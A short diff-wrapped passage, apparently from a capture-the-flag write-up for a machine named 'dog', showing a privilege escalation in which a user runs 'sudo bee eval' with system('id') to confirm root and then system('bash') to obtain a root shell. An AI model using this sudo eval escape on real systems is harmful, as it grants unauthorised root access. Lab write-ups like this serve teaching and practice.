@@ -1,0 +1,1 @@
+ncusack@dog:/var/www/html$ sudo bee eval 'system("id")' uid=0(root) gid=0(root) groups=0(root) Which is easy enough to get a shell as root: johncusack@dog:/var/www/html$ sudo bee eval 'system("bash")' root@dog:/var/www/html# And
